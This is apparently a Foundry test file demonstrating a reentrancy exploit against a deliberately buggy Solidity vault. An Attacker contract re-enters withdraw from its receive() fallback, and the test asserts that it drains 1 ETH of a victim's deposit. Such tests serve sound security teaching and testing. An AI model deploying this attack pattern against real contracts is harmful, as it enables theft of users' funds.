// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/ReentrantBuggyVault.sol";


contract Attacker {
    ReentrantBuggyVault public vault;
    uint256 public withdrawAmount;
    bool internal attacked;

    constructor(ReentrantBuggyVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        require(msg.value > 0, "need eth");
        withdrawAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            vault.withdraw(withdrawAmount);
        }
    }
}


contract ReentrantBuggyVaultTest is Test {
    ReentrantBuggyVault vault;
    Attacker attacker;

    address victim = address(0xBEEF);

    function setUp() public {
        vault = new ReentrantBuggyVault();
        attacker = new Attacker(vault);

        vm.deal(victim, 10 ether);
        vm.deal(address(attacker), 1 ether);

        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    function testReentrancyAttackDrainsExtraFunds() public {
        vm.deal(address(attacker), 1 ether);

        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 vaultBalanceBefore = address(vault).balance;

        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 vaultBalanceAfter = address(vault).balance;

        // attacker starts with 1 ETH, deposits it, then receives 2 ETH back
        // so net profit is 1 ETH
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1 ether);

        // vault should lose 1 ETH of victim funds
        assertEq(vaultBalanceAfter, vaultBalanceBefore - 1 ether);
    }
}